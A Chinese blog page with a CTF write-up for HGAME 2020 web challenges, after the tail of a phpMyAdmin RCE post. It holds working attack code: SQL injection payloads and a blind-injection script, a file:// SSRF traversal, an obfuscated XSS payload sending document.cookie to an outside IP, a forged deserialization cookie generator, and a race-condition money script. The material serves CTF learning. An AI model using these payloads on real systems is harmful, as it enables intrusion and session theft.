<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/08/phpmyadmin">http://blog.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="http://blog.ccreater.top/2020/02/08/phpmyadmin">http://blog.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/08/phpmyadmin%204.8.1%20rce/" data-id="cka3ckr37003cv4v0epy0cmod" data-title="phpmyadmin 4.8.1 rce" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020hgame" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/07/2020hgame/" class="article-date">
  <time class="dt-published" datetime="2020-02-07T12:20:03.284Z" itemprop="datePublished">2020-02-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/07/2020hgame/">2020hgame</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote>
<p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p>
</blockquote>
<p>根据提示下载.git</p>
<pre><code class="bash">$ git remote -v
#查看git</code></pre>
<p>查看提交历史拿到flag</p>
<h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p>
<pre><code>GET / HTTP/1.1
Host: kyaru.hgame.n3ko.co
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Cosmos Brower
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
referer: https://vidar.club/ 
x-forwarded-for: 127.0.0.1
If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT
Connection: close

</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p>
<p>修改GET为post</p>
<h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p>
<h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><pre><code class="php">&lt;?php
include &quot;config.php&quot;;
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET[&#39;debug&#39;])) {
        $debug = $_GET[&#39;debug&#39;];
        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
            die(&quot;args error!&quot;);
        }
        eval(&quot;var_dump($$debug);&quot;);
    }
}

if(isset($_SESSION[&#39;username&#39;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}
else {
    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){
            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];
            header(&quot;Location: admin.php&quot;);
            exit();
        }
        else {
            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;
        }
    }
}
?&gt;
</code></pre>
<p>adminpassword: 0e114902927253523756713132279690 </p>
<p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p>
<p>adminusername: Cosmos! </p>
<p>index.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
session_start();

if(isset($_SESSION[&#39;username&#39;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}

$action = @$_GET[&#39;action&#39;];
$filter = &quot;/config|etc|flag/i&quot;;

if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {
    if(preg_match($filter, $_GET[&#39;action&#39;])) {
        echo &quot;Hacker get out!&quot;;
        exit();
    }
        include $action;
}
elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {
    header(&quot;Location: ?action=login.php&quot;);
    exit();
}</code></pre>
<p>admin.php</p>
<pre><code class="php">&lt;?php
include &quot;config.php&quot;;
session_start();
if(!isset($_SESSION[&#39;username&#39;])) {
    header(&#39;Location: index.php&#39;);
    exit();
}

function insert_img() {
    if (isset($_POST[&#39;img_url&#39;])) {
        $img_url = @$_POST[&#39;img_url&#39;];
        $url_array = parse_url($img_url);
        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
    }
}
?&gt;

&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;
</code></pre>
<p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p>
<p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p>
<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p>
<p>过滤:select</p>
<p>黑名单:空格</p>
<pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#
information_schema,easysql
0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
f1aggggggggggggg,messages#
GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;
fl4444444g

hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p>
<pre><code class="php">&lt;?php

// function encrypt($str){
//     $result = &#39;&#39;;
//     for($i = 0; $i &lt; strlen($str); $i++){
//         $result .= chr(ord($str[$i]) + 1);
//     }
//     return $result;
// }
function encrypt($str)
{
    $result = &#39;&#39;;
    for($i = 0; $i &lt; strlen($str); $i++){
        $result .= chr(ord($str[$i]) - 1);
    }
    return $result;
}
$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;
$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);
preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;)
{
    $arr=array();
    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
    $newcmd=$arr[0].$newcmd.&quot;)&quot;;    
    $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

}

$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    


$dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);
?&gt;</code></pre>
<p>python </p>
<pre><code class="python">import requests
def get_flag():
    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]
    enccmd=enccmd[:len(enccmd)-75]
    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]
    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]
    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}
    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text
    data={&quot;token&quot;:dec}
    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])

get_flag()</code></pre>
<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre>
<p>输入会变成大写</p>
<h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p>
<p>而默认的逻辑是没法实现的</p>
<pre><code class="php">        if($this-&gt;rank &lt;= 2){
                $this-&gt;rank = 2;
            }</code></pre>
<p>阅读代码发现反序列化点:</p>
<p><code>Monster</code>的<code>__construct</code>方法</p>
<pre><code class="php">public function __construct($key){
        $this-&gt;encryptKey = $key;
        if(!isset($_COOKIE[&#39;monster&#39;])){
            $this-&gt;Set();
            return;
        }

        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);
        if(strlen($monsterData) &gt; 32){
            $sign = substr($monsterData, -32);
            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);
            if(md5($monsterData . $this-&gt;encryptKey) === $sign){
                $this-&gt;monsterData = unserialize($monsterData);
            }else{
                session_start();
                session_destroy();
                setcookie(&#39;monster&#39;, &#39;&#39;);
                header(&#39;Location: index.php&#39;);
                exit;
            }
        }

        $this-&gt;Set();     
    }</code></pre>
<p>但是要知道<code>$key</code>才能反序列化</p>
<p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p>
<pre><code class="php">
class Game
{   
    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;

    private $sign = &#39;&#39;;
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION[&#39;player&#39;] = $playerName;
        if(!isset($_SESSION[&#39;exp&#39;])){
            $_SESSION[&#39;exp&#39;] = 0;
        }
        $data = [$playerName, $this-&gt;encryptKey];
        $this-&gt;init($data);//set sign
        $this-&gt;monster = new Monster($this-&gt;sign);
        $this-&gt;rank = new Rank();
    }

    private function init($data){
        foreach($data as $key =&gt; $value){
            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
            $this-&gt;sign .= md5($this-&gt;sign . $value);
        }
    }
}</code></pre>
<p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p>
<pre><code class="php">public function __destruct(){
        // 确保程序是跑在服务器上的！
        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];
        if($this-&gt;key === $this-&gt;serverKey){
            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;
        }else{
            // 非正常访问
            session_start();
            session_destroy();
            setcookie(&#39;monster&#39;, &#39;&#39;);
            header(&#39;Location: index.php&#39;);
            exit;
        }
    }</code></pre>
<p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p>
<p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p>
<p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p>
<p>如:</p>
<pre><code class="php">&lt;?php
class test{
    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;
    public function __destruct()
    {
        echo $this-&gt;my_static;
    }

}
class tesa{

}
$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));
unserialize($a);


结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
<p>于是构造</p>
<pre><code class="php">&lt;?php
class Game
{
    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;

    public $sign = &#39;&#39;;
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION[&#39;player&#39;] = $playerName;
        if(!isset($_SESSION[&#39;exp&#39;])){
            $_SESSION[&#39;exp&#39;] = 0;
        }
        $data = [$playerName, $this-&gt;encryptKey];
        $this-&gt;init($data);//set sign
    }

    private function init($data){
        foreach($data as $key =&gt; $value){
            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
            $this-&gt;sign .= md5($this-&gt;sign . $value);
        }
    }
}
class Rank
{
    private $rank;
//    private $serverKey;     // 服务器的 Key
//    private $key;

    public function __construct()
    {
        $this-&gt;rank=1;
    }

    public function __destruct(){

    }
}
$s=new Rank();
//$s=array(&#39;name&#39;=&gt;&#39;蔡建斌&#39;,&#39;no&#39;=&gt;999999999999999999);
$a=new Game($_GET[&#39;name&#39;]);
$sign = md5(serialize($s) . $a-&gt;sign);
print( base64_encode(serialize($s) . $sign));
?&gt;
</code></pre>
<h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p>
<p>前一段时间爆出来的mt_srand逆向刚好可以用到</p>
<p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p>
<pre><code class="php">import requests
import os

burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;
burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text

a=eval(result)
p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )
x=p.read().strip()

burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;
burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
burp0_data = {&quot;ans&quot;: x}
print(burp0_data)
result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
print(result)
</code></pre>
<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p>
<p>admin,123456</p>
<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p>
<p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p>
<p>我来模拟以下造成条件竞争漏洞的原因</p>
<p>首先猜测以下solve和buy方法的流程</p>
<pre><code class="php">function solve()
{
    #1. $num=从数据库中查找要用户持有的卖出商品的个数
    #2. 如果数量足够,则进行下一步,否则返回并报错
    #3. 在数据库中增加用户账户里的钱
    #4. 在数据库中减少用户拥有该商品的数量
}</code></pre>
<p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p>
<ol>
<li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li>
<li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li>
<li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li>
<li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li>
<li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li>
<li>b进程结束</li>
</ol>
<p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p>
<p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p>
<p>刷钱脚本</p>
<pre><code class="python">from multiprocessing import Pool
import requests
def buy(num,loop=3):

    for i in range(loop):
        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if &quot;success&quot; in result:
            print(&quot;successfully buy %d items&quot; % num)


def solve(num,loop=3):

    for i in range(loop):
        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if &quot;success&quot; in result:
            print(&quot;successfully solve %d items&quot; % num)

if __name__==&#39;__main__&#39;:
    i=0
    while True:
        p = Pool(100)
        num=500
        for i in range(100):
            p.apply_async(buy, args=(num,))
        print(&#39;Waiting for all buy subprocesses done...&#39;)
        p.close()
        p.join()
        print(&#39;All subprocesses done.&#39;)

        p = Pool(100)

        for i in range(100):
            p.apply_async(solve, args=(num,))
        print(&#39;Waiting for all solve subprocesses done...&#39;)
        p.close()
        p.join()
        print(&#39;All subprocesses done.&#39;)
</code></pre>
<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p>
<pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, 
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]
disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre>
<p>一个个检测输入点发现,delete方法存在sql注入</p>
<p>注入脚本</p>
<pre><code class="python">import requests
from bs4 import BeautifulSoup
def send():

    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}
    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if res.status_code==200:
        return 1
    else :
        return 0

def get_id():


    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    html = res.text
    try :
        soup = BeautifulSoup(html,&#39;html.parser&#39;) #把网页解析为BeautifulSoup对象
        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]
    except:
        return False
    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)


def check(mesid):
    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)
    if url in res.text:
        return True
    return False
#index.php?method=delete&amp;delete_id=6594

def delete(mesid):
    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)


def sql_inj(sql):
    mesid=get_id()
    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)
    if not check(mesid):
        print(&quot;%s success&quot; % sql)
        send()
        return True
    print(&quot;%s fail&quot; % sql)
    return False

# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)
cha=&quot;0123456789ABCDEF&quot;
result=&quot;&quot;
p=0
while True:
    p+=1
